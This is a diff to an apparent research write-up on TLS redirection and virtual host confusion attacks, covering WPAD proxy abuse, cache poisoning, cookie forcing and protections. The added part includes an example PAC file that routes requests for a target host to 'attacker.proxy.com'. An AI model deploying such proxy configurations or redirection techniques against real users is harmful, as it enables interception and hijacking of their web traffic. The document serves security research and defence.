@@ -65,11 +65,25 @@ When the Attacked server and the TLS-brother server have different IPs (or ports
 #### Adversary proxy
 By attacking WPAD, the attacker can force a user’s browser to use different proxy servers for different domain names using the PAC file. As the attacker controls the proxy server, he or she can redirect requests from the user’s browser.
 
-Before the publication of several papers in 2016, attackers could set the rules at the URL level (Chrome, FF), and not just at the domain name level, which allowed more sophisticated TLS redirection attacks, for example, redirection and substitution of only parts of pages (scripts).
+Before the publication of several papers in 2016, attackers could set the rules at the URL level (Chrome, FF), and not just at the domain name level, which allowed more sophisticated TLS redirection attacks, for example, redirection and substitution of only parts of pages (Active Content Substitution).
 
 Chrome - fixed. FF - not fixed (last checked in Jan 2017).
 
-? picture
+Example of wpad file:
+
+    function FindProxyForURL(url, host) {
+        if (url == "https://HostA/crossdomain.xml") {
+            alert("Req 2 HostA w/ crossdomain "+url);
+            return "PROXY attacker.proxy.com:9999";
+        } else if (url.indexOf('https://HostA') !== -1) {
+            alert("Req 2 HostA "+url);
+            return "PROXY attacker.proxy.com:8888";
+        } else {
+            alert("for another hosts "+url);
+            return "DIRECT";
+        }
+    }
+
 
 #### Cache poisoning attack
 Most web servers add headers, which allow caching of static content (JS, CSS), by default. A browser caches responses binding them to the full URL, if there is a permission (in the headers from the web server).
@@ -91,7 +105,6 @@ After that, the attacker forces the user to send a request to the page (at the A
 If any user-generated content (for example, HTML pages) can be uploaded to the TLS-brother server, then an attacker can execute JS code in the context of the Attacked server at the user's browser using the TLS redirection attack.
 
 Moreover, the attacker can attack auto update services on the user’s host if he or she can place a file using the same path (on the TLS-brother server) over which the service tries to download the file from the Attacked server.
-
 
 [Video: Virtual host confusion exploit against Dropbox](https://www.youtube.com/watch?v=CkOGKi0pKdk)
 
@@ -206,12 +219,11 @@ The attacker uses cookie forcing technique and sets an additional cookie in the 
 Similar attacks can be performed if the attacker controls the content of files on the TLS-brother server.
 
 Potentially vulnerable features:
-JQuery's load
-JQuery's get, post, ajax (old version, with specific Content-Types)
-HTML import (test is required)
+- JQuery's load
+- JQuery's get, post, ajax (old version, with specific Content-Types)
+- HTML import (test is required)
 
 [WPAD](#adversary_proxy) attack or [Cache poisoning attack](#cache_poisoning_attack) might be useful here.
-
 
 #### HTTPS 2 HTTP redirect
 If the TLS-brother server redirects the request to the HTTP protocol, then it will be possible to capture and steal some information from it (token, for example ) after it is redirected.
@@ -228,7 +240,6 @@ If a system uses client authentication using a TLS certificate, then, in case of
 
 #### Certificate Pinning
 Certificate pinning allows you to bind a server name to a specific certificate, but if both the TLS-brother and the Attacked server use the same certificate, attacker can perform a TLS-redirection attack and, possibly, somehow affect the behavior of the client.
-
 
 ## Protection
 - At the TLS protocol level, Alert is returned from the server if the SNI from the TLS request does not match the value from the certificate on the server.
